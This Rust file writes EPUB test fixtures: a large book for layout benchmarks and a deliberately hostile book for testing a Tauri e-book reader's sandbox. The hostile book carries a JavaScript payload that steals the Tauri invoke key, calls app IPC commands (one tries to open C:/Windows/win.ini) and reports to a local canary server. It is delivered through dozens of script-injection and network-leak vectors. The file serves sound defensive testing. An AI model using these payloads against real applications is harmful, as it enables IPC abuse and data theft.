//! Writes EPUB fixtures: a large book for measuring layout, and a hostile one for testing the
//! reader's isolation. Written by hand, so the bytes are deterministic and each book is exactly
//! as long or as hostile as it says.

use std::fmt::Write as _;
use std::fs::File;
use std::io::{self, BufWriter, Write};
use std::path::Path;

use flate2::write::DeflateEncoder;
use flate2::{Compression, Crc};

use crate::XorShift;

/// The little ZIP that an EPUB is. No extensions, and fixed timestamps.
pub(crate) struct ZipWriter<W: Write> {
    out: W,
    position: u32,
    central: Vec<u8>,
    entries: u16,
}

impl<W: Write> ZipWriter<W> {
    pub(crate) fn new(out: W) -> Self {
        Self {
            out,
            position: 0,
            central: Vec::new(),
            entries: 0,
        }
    }

    pub(crate) fn add(&mut self, name: &str, data: &[u8], compress: bool) -> io::Result<()> {
        const UTF8_NAMES: u16 = 1 << 11;
        const JANUARY_1980: u16 = 0x21;

        let mut crc = Crc::new();
        crc.update(data);
        let compressed;
        let (method, body): (u16, &[u8]) = if compress {
            let mut encoder = DeflateEncoder::new(Vec::new(), Compression::new(6));
            encoder.write_all(data)?;
            compressed = encoder.finish()?;
            (8, &compressed)
        } else {
            (0, data)
        };

        let mut fields = Vec::with_capacity(26);
        fields.extend_from_slice(&20u16.to_le_bytes());
        fields.extend_from_slice(&UTF8_NAMES.to_le_bytes());
        fields.extend_from_slice(&method.to_le_bytes());
        fields.extend_from_slice(&0u16.to_le_bytes());
        fields.extend_from_slice(&JANUARY_1980.to_le_bytes());
        fields.extend_from_slice(&crc.sum().to_le_bytes());
        fields.extend_from_slice(&(body.len() as u32).to_le_bytes());
        fields.extend_from_slice(&(data.len() as u32).to_le_bytes());
        fields.extend_from_slice(&(name.len() as u16).to_le_bytes());
        fields.extend_from_slice(&0u16.to_le_bytes());

        self.central.extend_from_slice(b"PK\x01\x02");
        self.central.extend_from_slice(&20u16.to_le_bytes());
        self.central.extend_from_slice(&fields);
        // Comment length, disk, internal and external attributes.
        self.central.extend_from_slice(&[0; 10]);
        self.central.extend_from_slice(&self.position.to_le_bytes());
        self.central.extend_from_slice(name.as_bytes());
        self.entries += 1;

        self.out.write_all(b"PK\x03\x04")?;
        self.out.write_all(&fields)?;
        self.out.write_all(name.as_bytes())?;
        self.out.write_all(body)?;
        self.position += (4 + fields.len() + name.len() + body.len()) as u32;
        Ok(())
    }

    pub(crate) fn finish(&mut self) -> io::Result<()> {
        self.out.write_all(&self.central)?;
        self.out.write_all(b"PK\x05\x06")?;
        self.out.write_all(&[0; 4])?;
        self.out.write_all(&self.entries.to_le_bytes())?;
        self.out.write_all(&self.entries.to_le_bytes())?;
        self.out
            .write_all(&(self.central.len() as u32).to_le_bytes())?;
        self.out.write_all(&self.position.to_le_bytes())?;
        self.out.write_all(&[0; 2])?;
        self.out.flush()
    }
}

/// A file of the book other than its chapters.
struct Resource {
    name: String,
    media_type: &'static str,
    data: Vec<u8>,
}

/// One entry in the book's reading order.
struct Chapter {
    name: String,
    /// Whatever goes in `<head>`, after the title.
    head: String,
    /// Attributes of `<body>`.
    body_attributes: String,
    body: String,
}

impl Chapter {
    fn xhtml(&self) -> String {
        format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE html>\n\
             <html xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:epub=\"http://www.idpf.org/2007/ops\" \
             lang=\"en\" xml:lang=\"en\">\n<head><title>{}</title>{}</head>\n<body{}>\n{}\n</body>\n</html>\n",
            self.name, self.head, self.body_attributes, self.body
        )
    }
}

fn write_book(
    path: &Path,
    title: &str,
    chapters: &[Chapter],
    resources: &[Resource],
) -> io::Result<()> {
    let mut manifest = String::from(
        "<item id=\"nav\" href=\"nav.xhtml\" media-type=\"application/xhtml+xml\" properties=\"nav\"/>\n",
    );
    let mut spine = String::new();
    let mut toc = String::new();
    for (index, chapter) in chapters.iter().enumerate() {
        let name = &chapter.name;
        writeln!(
            manifest,
            "<item id=\"c{index}\" href=\"{name}.xhtml\" media-type=\"application/xhtml+xml\" \
             properties=\"scripted\"/>"
        )
        .expect("writing to a String cannot fail");
        writeln!(spine, "<itemref idref=\"c{index}\"/>").expect("writing to a String cannot fail");
        writeln!(toc, "<li><a href=\"{name}.xhtml\">{name}</a></li>")
            .expect("writing to a String cannot fail");
    }
    for (index, resource) in resources.iter().enumerate() {
        writeln!(
            manifest,
            "<item id=\"r{index}\" href=\"{}\" media-type=\"{}\"/>",
            resource.name, resource.media_type
        )
        .expect("writing to a String cannot fail");
    }
    let package = format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
         <package xmlns=\"http://www.idpf.org/2007/opf\" version=\"3.0\" unique-identifier=\"id\">\n\
         <metadata xmlns:dc=\"http://purl.org/dc/elements/1.1/\">\n\
         <dc:identifier id=\"id\">urn:uuid:00000000-0000-4000-8000-000000000000</dc:identifier>\n\
         <dc:title>{title}</dc:title><dc:language>en</dc:language>\n\
         <meta property=\"dcterms:modified\">2026-01-01T00:00:00Z</meta>\n</metadata>\n\
         <manifest>\n{manifest}</manifest>\n<spine>\n{spine}</spine>\n</package>\n"
    );
    let nav = format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
         <html xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:epub=\"http://www.idpf.org/2007/ops\">\n\
         <head><title>{title}</title></head><body><nav epub:type=\"toc\"><ol>\n{toc}</ol></nav></body></html>\n"
    );
    const CONTAINER: &str = "<?xml version=\"1.0\"?>\n\
        <container version=\"1.0\" xmlns=\"urn:oasis:names:tc:opendocument:xmlns:container\">\n\
        <rootfiles><rootfile full-path=\"OEBPS/content.opf\" \
        media-type=\"application/oebps-package+xml\"/></rootfiles>\n</container>\n";

    let mut zip = ZipWriter::new(BufWriter::new(File::create(path)?));
    // The format requires this to be first and uncompressed.
    zip.add("mimetype", b"application/epub+zip", false)?;
    zip.add("META-INF/container.xml", CONTAINER.as_bytes(), true)?;
    zip.add("OEBPS/content.opf", package.as_bytes(), true)?;
    zip.add("OEBPS/nav.xhtml", nav.as_bytes(), true)?;
    for chapter in chapters {
        zip.add(
            &format!("OEBPS/{}.xhtml", chapter.name),
            chapter.xhtml().as_bytes(),
            true,
        )?;
    }
    for resource in resources {
        zip.add(&format!("OEBPS/{}", resource.name), &resource.data, true)?;
    }
    zip.finish()
}

const WORDS: [&str; 48] = [
    "the",
    "of",
    "and",
    "to",
    "a",
    "in",
    "that",
    "was",
    "he",
    "his",
    "with",
    "had",
    "for",
    "it",
    "as",
    "at",
    "on",
    "she",
    "but",
    "her",
    "which",
    "from",
    "they",
    "said",
    "could",
    "would",
    "there",
    "their",
    "thought",
    "remembered",
    "morning",
    "window",
    "harbour",
    "afterwards",
    "conversation",
    "extraordinary",
    "nevertheless",
    "understanding",
    "neighbourhood",
    "silence",
    "letters",
    "evening",
    "garden",
    "library",
    "stranger",
    "travelled",
    "whispered",
    "mountains",
];

/// Prose of about `bytes` bytes of markup, with what a long chapter of a real book has:
/// paragraphs of varied length, emphasis, and a heading now and then.
fn prose(bytes: usize, seed: u64) -> String {
    let mut rng = XorShift::new(seed);
    let mut text = String::with_capacity(bytes + 1024);
    let mut paragraph = 0;
    while text.len() < bytes {
        if paragraph % 24 == 0 {
            writeln!(text, "<h2>Part {}</h2>", paragraph / 24 + 1)
                .expect("writing to a String cannot fail");
        }
        paragraph += 1;
        text.push_str("<p>");
        for sentence in 0..(2 + rng.below(6)) {
            for word in 0..(6 + rng.below(16)) {
                let picked = WORDS[rng.below(WORDS.len() as u32) as usize];
                if word > 0 {
                    text.push(' ');
                }
                if rng.below(40) == 0 {
                    write!(text, "<em>{picked}</em>").expect("writing to a String cannot fail");
                } else {
                    text.push_str(picked);
                }
            }
            text.push_str(if sentence % 5 == 4 { "; " } else { ". " });
        }
        text.push_str("</p>\n");
    }
    text
}

/// The size of a section in the large book, as the layout benchmark reports it.
pub const LARGE_SECTIONS: [(&str, usize); 5] = [
    ("20-kib", 20 << 10),
    ("200-kib", 200 << 10),
    ("400-kib", 400 << 10),
    ("1-mib", 1 << 20),
    ("3-mib", 3 << 20),
];

/// A book whose first sections cover the range from a normal chapter to a whole novel in one
/// file, followed by ordinary chapters to page through. foliate-js lays out one section at a
/// time, so it is the section's size that decides what a font change costs.
pub fn write_large_epub(path: &Path) -> io::Result<()> {
    const STYLE: &str = "body { font-family: Georgia, serif; line-height: 1.5; }\n\
        p { margin: 0; text-indent: 1.5em; text-align: justify; hyphens: auto; }\n\
        h2 { font-size: 1.4em; margin: 1.5em 0 0.5em; text-align: center; }\n\
        em { font-style: italic; }\n";

    let head = "<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\"/>".to_owned();
    let mut chapters: Vec<Chapter> = LARGE_SECTIONS
        .iter()
        .enumerate()
        .map(|(index, &(name, bytes))| Chapter {
            name: name.to_owned(),
            head: head.clone(),
            body_attributes: String::new(),
            body: prose(bytes, index as u64 + 1),
        })
        .collect();
    for index in 0..40 {
        chapters.push(Chapter {
            name: format!("chapter-{index:02}"),
            head: head.clone(),
            body_attributes: String::new(),
            body: prose(30 << 10, index + 100),
        });
    }
    write_book(
        path,
        "A Very Long Book",
        &chapters,
        &[Resource {
            name: "style.css".to_owned(),
            media_type: "text/css",
            data: STYLE.as_bytes().to_vec(),
        }],
    )
}

pub(crate) fn xml_escape(text: &str) -> String {
    text.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('"', "&quot;")
}

/// What every hostile script tries, if it ever runs. It marks the document, then tells whoever
/// listens how far it got: a canary server outside the app, and the frames above it. It then
/// goes for the app's IPC by every route there is, the tile protocol and the app's own origin.
///
/// On WebView2, Tauri's initialization scripts run in every frame, so a script here finds the
/// real `__TAURI_INTERNALS__`, with the real invoke key inside. So this uses it as the app
/// would, steals the key from the call, and also sends a message with that key by itself.
fn payload(port: u16, vector: &str) -> String {
    format!(
        r#"(function(v){{
var h=document.documentElement;if(h)h.setAttribute('data-pwned',v);
try{{top.postMessage({{pwned:v}},'*')}}catch(e){{}}
var base='http://127.0.0.1:{port}';
try{{new Image().src=base+'/script/'+v}}catch(e){{}}
var r={{vector:v,origin:String(self.origin)}};
function t(n,f){{try{{r[n]=String(f())}}catch(e){{r[n]='blocked: '+e.name}}}}
t('topDocument',function(){{return top.document.title}});
t('topTauri',function(){{return typeof top.__TAURI_INTERNALS__}});
t('ownTauri',function(){{return typeof self.__TAURI_INTERNALS__}});
t('ownIpc',function(){{return typeof self.ipc}});

t('webviewApi',function(){{return self.chrome?typeof self.chrome.webview:'undefined'}});
var key=null;
try{{var set=Headers.prototype.set;Headers.prototype.set=function(n,x){{if(String(n).toLowerCase()==='tauri-invoke-key')key=x;return set.apply(this,arguments)}}}}catch(e){{}}
function send(){{try{{fetch(base+'/report',{{method:'POST',mode:'no-cors',body:JSON.stringify(r)}})}}catch(e){{}}}}
function probe(n,u,o){{return fetch(u,o).then(function(x){{r[n]='status '+x.status}},function(e){{r[n]='blocked: '+e.message}})}}
function late(p){{return Promise.race([p,new Promise(function(w){{setTimeout(w,150)}})])}}
function invoke(n,c,a){{r[n]='no answer';try{{return late(self.__TAURI_INTERNALS__.invoke(c,a).then(function(x){{r[n]='allowed: '+JSON.stringify(x).slice(0,80)}},function(e){{r[n]='rejected: '+String(e).slice(0,80)}}))}}catch(e){{r[n]='blocked: '+e.name;return null}}}}
function post(n,f){{try{{f(JSON.stringify({{cmd:'bench_fail',callback:1,error:2,payload:{{message:'pwned by a book through '+n}},options:{{}},__TAURI_INVOKE_KEY__:key}}));r[n]='sent, key '+(key?'stolen':'unknown')}}catch(e){{r[n]='blocked: '+e.name}}}}
Promise.all([
probe('ipcFetch','http://ipc.localhost/bench_fail',{{method:'POST',headers:{{'Content-Type':'application/json','Tauri-Callback':'1','Tauri-Error':'2','Tauri-Invoke-Key':'guess'}},body:'{{"message":"pwned by a book"}}'}}),
probe('tileFetch','http://tile.localhost/1/geometry',{{}}),
probe('appFetch','http://tauri.localhost/index.html',{{}}),
invoke('invokeRead','startup_options',{{}}),
invoke('invokeOpen','open_session',{{args:{{pdf:'C:/Windows/win.ini',delivery:'a',workers:1}}}}),
invoke('invokeExit','bench_fail',{{message:'pwned by a book through invoke'}})
]).then(function(){{
post('webviewPost',function(m){{self.chrome.webview.postMessage(m)}});
post('ipcPost',function(m){{self.ipc.postMessage(m)}});
}}).then(function(){{return new Promise(function(w){{setTimeout(w,50)}})}}).then(send,send);
}})('{vector}');"#
    )
}

fn script_tag(body: &str) -> String {
    format!("<script type=\"text/javascript\">//<![CDATA[\n{body}\n//]]></script>")
}

/// Every way this file knows for a book to run a script or reach the network without one. The
/// names say what each chapter attempts, and the tests report them by name.
///
/// `port` is where a canary server should be listening, so that whatever gets out is seen.
pub fn write_hostile_epub(path: &Path, port: u16) -> io::Result<()> {
    let run = |vector: &str| payload(port, vector);
    let attr = |vector: &str| xml_escape(&payload(port, vector));
    let net = |vector: &str| format!("http://127.0.0.1:{port}/net/{vector}");

    let mut chapters = Vec::new();
    let mut add = |name: &str, head: String, body_attributes: String, body: String| {
        chapters.push(Chapter {
            name: name.to_owned(),
            head,
            body_attributes,
            body: format!("<p id=\"chapter-loaded\">Section {name}.</p>\n{body}"),
        });
    };
    let plain = String::new;

    // Scripts, by every door.
    add(
        "script-inline",
        plain(),
        plain(),
        script_tag(&run("script-inline")),
    );
    add(
        "script-in-head",
        script_tag(&run("script-in-head")),
        plain(),
        plain(),
    );
    add(
        "script-external",
        plain(),
        plain(),
        "<script src=\"evil.js\" type=\"text/javascript\"></script>".to_owned(),
    );
    add(
        "script-module",
        plain(),
        plain(),
        format!(
            "<script type=\"module\">//<![CDATA[\n{}\n//]]></script>",
            run("script-module")
        ),
    );
    add(
        "script-data-url",
        plain(),
        plain(),
        format!(
            "<script src=\"data:text/javascript,{}\" type=\"text/javascript\"></script>",
            attr("script-data-url")
                .replace('%', "%25")
                .replace('#', "%23")
        ),
    );
    add(
        "handler-image-error",
        plain(),
        plain(),
        format!(
            "<img src=\"missing.png\" alt=\"\" onerror=\"{}\"/>",
            attr("handler-image-error")
        ),
    );
    add(
        "handler-body-load",
        plain(),
        format!(" onload=\"{}\"", attr("handler-body-load")),
        plain(),
    );
    add(
        "handler-focus",
        plain(),
        plain(),
        format!(
            "<input autofocus=\"autofocus\" onfocus=\"{}\"/>",
            attr("handler-focus")
        ),
    );
    add(
        "svg-script",
        plain(),
        plain(),
        format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"10\" height=\"10\">{}</svg>",
            script_tag(&run("svg-script"))
        ),
    );
    add(
        "svg-onload",
        plain(),
        plain(),
        format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"10\" height=\"10\" onload=\"{}\"/>",
            attr("svg-onload")
        ),
    );
    add(
        "svg-animate",
        plain(),
        plain(),
        format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"10\" height=\"10\"><rect width=\"9\" \
             height=\"9\"><animate attributeName=\"x\" from=\"0\" to=\"1\" dur=\"1ms\" onbegin=\"{}\"/>\
             </rect></svg>",
            attr("svg-animate")
        ),
    );
    add(
        "frame-srcdoc",
        plain(),
        plain(),
        format!(
            "<iframe srcdoc=\"{}\"></iframe>",
            xml_escape(&format!("<script>{}</script>", run("frame-srcdoc")))
        ),
    );
    add(
        "frame-javascript-url",
        plain(),
        plain(),
        format!(
            "<iframe src=\"javascript:{}\"></iframe>",
            attr("frame-javascript-url")
        ),
    );
    add(
        "frame-chapter",
        plain(),
        plain(),
        "<iframe src=\"evil-frame.xhtml\"></iframe>".to_owned(),
    );
    add(
        "object-svg",
        plain(),
        plain(),
        "<object data=\"evil-object.svg\" type=\"image/svg+xml\"></object>".to_owned(),
    );
    add(
        "embed-svg",
        plain(),
        plain(),
        "<embed src=\"evil-embed.svg\" type=\"image/svg+xml\"/>".to_owned(),
    );
    add(
        "refresh-javascript",
        format!(
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:{}\"/>",
            attr("refresh-javascript")
        ),
        plain(),
        plain(),
    );
    // The reader clicks these two, the way a reader of the book would.
    add(
        "click-javascript-link",
        plain(),
        plain(),
        format!(
            "<a data-poke=\"click\" href=\"javascript:{}\">Read more</a>",
            attr("click-javascript-link")
        ),
    );
    add(
        "click-javascript-form",
        plain(),
        plain(),
        format!(
            "<form data-poke=\"submit\" action=\"javascript:{}\"><input type=\"submit\"/></form>",
            attr("click-javascript-form")
        ),
    );

    // The network, with no script at all.
    let tag = |name: &str, markup: String| (name.to_owned(), markup);
    let network = [
        tag(
            "net-image",
            format!("<img alt=\"\" src=\"{}\"/>", net("net-image")),
        ),
        tag(
            "net-image-srcset",
            format!(
                "<img alt=\"\" src=\"a.png\" srcset=\"{} 2x\"/>",
                net("net-image-srcset")
            ),
        ),
        tag(
            "net-audio",
            format!(
                "<audio src=\"{}\" autoplay=\"autoplay\"></audio>",
                net("net-audio")
            ),
        ),
        tag(
            "net-video-poster",
            format!("<video poster=\"{}\"></video>", net("net-video-poster")),
        ),
        tag(
            "net-frame",
            format!("<iframe src=\"{}\"></iframe>", net("net-frame")),
        ),
        tag(
            "net-object",
            format!(
                "<object data=\"{}\" type=\"text/html\"></object>",
                net("net-object")
            ),
        ),
        tag(
            "net-embed",
            format!("<embed src=\"{}\" type=\"text/html\"/>", net("net-embed")),
        ),
        tag(
            "net-svg-image",
            format!(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" \
                 width=\"9\" height=\"9\"><image xlink:href=\"{}\" width=\"9\" height=\"9\"/></svg>",
                net("net-svg-image")
            ),
        ),
        tag(
            "net-svg-use",
            format!(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" \
                 width=\"9\" height=\"9\"><use xlink:href=\"{}#x\"/></svg>",
                net("net-svg-use")
            ),
        ),
        tag(
            "net-link-ping",
            format!(
                "<a data-poke=\"click\" href=\"#here\" ping=\"{}\">Read more</a>",
                net("net-link-ping")
            ),
        ),
        tag(
            "net-form",
            format!(
                "<form data-poke=\"submit\" action=\"{}\"><input type=\"submit\"/></form>",
                net("net-form")
            ),
        ),
        tag(
            "net-tile-protocol",
            "<img alt=\"\" src=\"http://tile.localhost/1/geometry\"/>".to_owned(),
        ),
    ];
    for (name, markup) in network {
        add(&name, plain(), plain(), markup);
    }
    let head_vectors = [
        tag(
            "net-stylesheet",
            format!(
                "<link rel=\"stylesheet\" type=\"text/css\" href=\"{}\"/>",
                net("net-stylesheet")
            ),
        ),
        tag(
            "net-css-url",
            format!(
                "<style type=\"text/css\">body {{ background: url('{}'); }}</style>",
                net("net-css-url")
            ),
        ),
        tag(
            "net-css-import",
            format!(
                "<style type=\"text/css\">@import '{}';</style>",
                net("net-css-import")
            ),
        ),
        tag(
            "net-font-face",
            format!(
                "<style type=\"text/css\">@font-face {{ font-family: x; src: url('{}'); }} \
                 p {{ font-family: x; }}</style>",
                net("net-font-face")
            ),
        ),
        tag(
            "net-prefetch",
            format!("<link rel=\"prefetch\" href=\"{}\"/>", net("net-prefetch")),
        ),
        tag(
            "net-preload",
            format!(
                "<link rel=\"preload\" as=\"image\" href=\"{}\"/>",
                net("net-preload")
            ),
        ),
        tag(
            "net-refresh",
            format!(
                "<meta http-equiv=\"refresh\" content=\"0;url={}\"/>",
                net("net-refresh")
            ),
        ),
        tag(
            "net-base",
            format!("<base href=\"http://127.0.0.1:{port}/net/net-base/\"/>"),
        ),
    ];
    for (name, markup) in head_vectors {
        let body = if name == "net-base" {
            "<img alt=\"\" src=\"pixel.png\"/>".to_owned()
        } else {
            plain()
        };
        add(&name, markup, plain(), body);
    }

    let frame_chapter = Chapter {
        name: "evil-frame".to_owned(),
        head: plain(),
        body_attributes: plain(),
        body: script_tag(&run("frame-chapter")),
    };
    let svg_with = |vector: &str| {
        format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"10\" height=\"10\">{}</svg>",
            script_tag(&run(vector))
        )
        .into_bytes()
    };
    write_book(
        path,
        "A Hostile Book",
        &chapters,
        &[
            Resource {
                name: "evil.js".to_owned(),
                media_type: "text/javascript",
                data: run("script-external").into_bytes(),
            },
            Resource {
                name: "evil-frame.xhtml".to_owned(),
                media_type: "application/xhtml+xml",
                data: frame_chapter.xhtml().into_bytes(),
            },
            Resource {
                name: "evil-object.svg".to_owned(),
                media_type: "image/svg+xml",
                data: svg_with("object-svg"),
            },
            Resource {
                name: "evil-embed.svg".to_owned(),
                media_type: "image/svg+xml",
                data: svg_with("embed-svg"),
            },
        ],
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn prose_reaches_the_requested_size_without_much_overshoot() {
        let text = prose(100 << 10, 1);
        assert!(text.len() >= 100 << 10);
        assert!(text.len() < (100 << 10) + 4096);
        assert_eq!(text, prose(100 << 10, 1), "must be deterministic");
    }

    #[test]
    fn payloads_can_sit_in_xml_attributes_once_escaped() {
        let escaped = xml_escape(&payload(1234, "x"));
        assert!(!escaped.contains('<'));
        assert!(!escaped.contains('"'));
    }

    #[test]
    fn payloads_do_not_end_a_cdata_section_early() {
        assert!(!payload(1234, "x").contains("]]>"));
    }

    #[test]
    fn a_zip_has_the_signatures_and_offsets_readers_look_for() {
        let mut bytes = Vec::new();
        let mut zip = ZipWriter::new(&mut bytes);
        zip.add("mimetype", b"application/epub+zip", false).unwrap();
        zip.add("a.txt", b"hello hello hello", true).unwrap();
        zip.finish().unwrap();

        assert_eq!(&bytes[..4], b"PK\x03\x04");
        assert_eq!(&bytes[30..38], b"mimetype");
        assert_eq!(
            &bytes[38..58],
            b"application/epub+zip",
            "stored, right after its name"
        );

        let end = bytes.len() - 22;
        assert_eq!(&bytes[end..end + 4], b"PK\x05\x06");
        let word = |at: usize| u32::from_le_bytes(bytes[at..at + 4].try_into().unwrap()) as usize;
        let (central_len, central_at) = (word(end + 12), word(end + 16));
        assert_eq!(central_at + central_len, end);
        assert_eq!(&bytes[central_at..central_at + 4], b"PK\x01\x02");
        assert_eq!(u16::from_le_bytes([bytes[end + 10], bytes[end + 11]]), 2);
    }
}
